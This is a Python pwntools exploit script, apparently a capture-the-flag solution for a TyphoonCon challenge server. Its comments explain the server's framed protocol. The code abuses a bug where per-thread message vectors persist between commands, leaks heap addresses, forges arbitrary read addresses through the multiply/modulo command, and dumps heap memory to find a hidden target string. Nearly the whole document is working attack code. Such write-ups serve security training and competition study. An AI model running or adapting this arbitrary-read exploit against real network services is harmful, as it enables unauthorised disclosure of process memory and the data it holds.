import sys
from pwn import *

REMOTE_ADDR = '10.0.2.2'
REMOTE_PORT = 13337

if len(sys.argv) > 1:
    REMOTE_ADDR = sys.argv[1]

# Target string copied from 0x0134823C into buffers[254].

# There is a data structure holding the messages for each thread like
# struct thread_input
# {
#   __int64 thread_index;
#   __int64 len;
#   char *buf;
# };
# The thread index is incremented for every child socket that connects.
# The other two fields are used differently depending on the command sent.

# Layout of a network message frame:
# 0-4: magic number 0xdeadbeef
# 5: number of commands in this frame
# 6: command id (0, 2, 3, 4)
# next bytes depend on command id

# Command 0: No Op
# len and buf = 0

# Command 2: To uppercase (AND 0xdf)
# Command 3: To lowercase (OR 0x20)
# 1 byte: length of string
# rest: content of string
# Content is copied into one of the buffers allocated at the start of the application.

# Command 4:
# 4 bytes: number1
# 4 bytes: number2
# Puts the following in the above thread_input struct
# len = number1 % number2
# buf = number1 * number2


def send_toupper(strings, expected_min_length=1):
    if len(strings) > 0xff:
        raise Exception("Too many strings {} > 255".format(len(strings)))
    #       magic             number of commands   command id
    frame = p32(0xdeadbeef) + p8(len(strings)) +   p8(2)

    for s in strings:
        if len(s) > 255:
            raise Exception("String too long {} > 255".format(len(s)))
        frame += p8(len(s))
        frame += s
    
    # Only recv 4096 bytes chunks.
    if len(frame) > 4096:
        raise Exception("Frame too large. {} > 4096".format(len(frame)))
    r.send(frame)

    recv_frames = b''
    while len(recv_frames) < expected_min_length:
        recv_frames += r.recv(timeout=60)
    #print(hexdump(recv_frames))
    
    # Parse the response.
    assert(u32(recv_frames[:4]) == 0xdeadbeef)
    num_strings = u8(recv_frames[4])
    command_id = u8(recv_frames[5])
    log.info('Received {} strings for command {}'.format(num_strings, command_id))
    assert(command_id == 2)

    strings = []
    offs = 6
    for i in range(num_strings):
        length = u8(recv_frames[offs:offs+1])
        strings.append((length, recv_frames[offs+1:offs+1+length]))
        #log.info('Message {}: {:x} | {}'.format(i, strings[i][0], strings[i][1]))
        offs += length + 1
    return strings, recv_frames

def send_address(addresses):
    if len(addresses) > 0xff:
        raise Exception("Too many addresses {} > 255".format(len(addresses)))
    #       magic             number of commands   command id
    frame = p32(0xdeadbeef) + p8(len(addresses)) + p8(4)

    for a in addresses:
        needed_length = a[1]
        while a[0] % needed_length != 0:
            needed_length += 1
        frame += p32(needed_length) + p32(a[0] // needed_length)
    
    r.send(frame)
    if len(frame) > 4096:
        raise Exception("Frame too large. {} > 4096".format(len(frame)))

    recv_frames = r.recv(timeout=60)
    #print(hexdump(recv_frames))

    assert(u32(recv_frames[:4]) == 0xdeadbeef)
    num_commands = u8(recv_frames[4])
    command_id = u8(recv_frames[5])
    log.info('Received {} messages for command {}'.format(num_commands, command_id))
    assert(command_id == 4)

    expected_size = 6 + num_commands * 8
    if len(recv_frames) < expected_size:
        log.warn('Response truncated! {} < {}'.format(len(recv_frames), expected_size))
        recv_frames += r.recv()

    commands = []
    for i in range(num_commands):
        offs = 6 + 8 * i
        commands.append((u32(recv_frames[offs:offs+4]), u32(recv_frames[offs+4:offs+8])))
        #log.info('Message {}: {:x} | {:x}'.format(i, commands[i][0], commands[i][1]))
    return commands

r = remote(REMOTE_ADDR, REMOTE_PORT)

log.info('Putting heap addresses of buffers into the vector.')
# first put the address of the 253 buffer into the list
send_toupper(['A']*253)

# Abuse the bug, that the per-thread message vectors in the child threads
# are persistent over different received messages.
# So the items you've added using one command will be sent back using
# the response packing code of the current command.
# You can use the multiply and modulo command #4 to leak the addresses of the
# buffers put into the vector by the previous ascii-to-uppercase command #2 above.
# Same way around you can craft any address using command #4 and print the memory using command #2 later.
log.info('Leak the addresses.')
KUSER_SHARED_DATA = 0x7ffe0000 # use some pointer we can be sure is valid
response = send_address([(KUSER_SHARED_DATA, 1)])

# Heap addresses are growing in 0x10000 chunks. 
# Since the buffers are all malloc'd in sequence their addresses
# grow nearly sequencially. So we assume the last buffer allocated,
# which contains the target "TyphoonCon" string, is in the range around
# where the other high buffer addresses are.
addresses = [a[1] & 0xfffff000 for a in response[:-1]]
addresses = list(set(addresses))
addresses.sort()
#print(addresses)

# Dump the last 0xa000 bytes around the end of the know heap buffer addresses.
DUMP_SIZE = 0xa000
#DUMP_SIZE = 0x10000
first_heap_page = addresses[-1] - (DUMP_SIZE / 2)
last_heap_page = addresses[-1] + (DUMP_SIZE / 2)
r.close()

# Start a new session, so we have a fresh message queue.
r = remote(REMOTE_ADDR, REMOTE_PORT)
log.info('Dumping heap 0x{:x} - 0x{:x} ({:x} bytes)'.format(first_heap_page, last_heap_page, DUMP_SIZE))

# Depending on the heap base address, get as much data per message as possible,
# given the formula used in message handler 4.
# 4 bytes: new_len = len % buf
# 4 bytes: new_buf = buf * len
def find_largest_possible_size(addr):
    largest_possible_size = 0
    for i in range(addr, 0, -1):
        if addr % i != 0:
            continue
        sent_buf = addr // i
        resulting_len = i % sent_buf
        if resulting_len == i and resulting_len > largest_possible_size:
            largest_possible_size = resulting_len
    return largest_possible_size

addresses = []
addr = first_heap_page
while addr < last_heap_page + 0x1000:
    size = find_largest_possible_size(addr)
    addresses.append((addr, size))
    addr += size

# The size returned to the user is only 1 byte,
# but all 4 bytes are used for the size when copying the values.
# So we can have it return longer chunks of data than the command #2
# usually allows due to the 1 byte length field.
send_address(addresses)

# See if we found the winning string in the dump.
_, recv_frames = send_toupper(['B'], DUMP_SIZE)
if b'TyphoonCon' in recv_frames:
    string_start = recv_frames.index(b'TyphoonCon')
    target_string = recv_frames[string_start:string_start+38]
    log.success('Found target string: {}'.format(target_string))
else:
    log.failure('Target string wasn\'t in the dumped heap area. Exploit failed.')
r.close()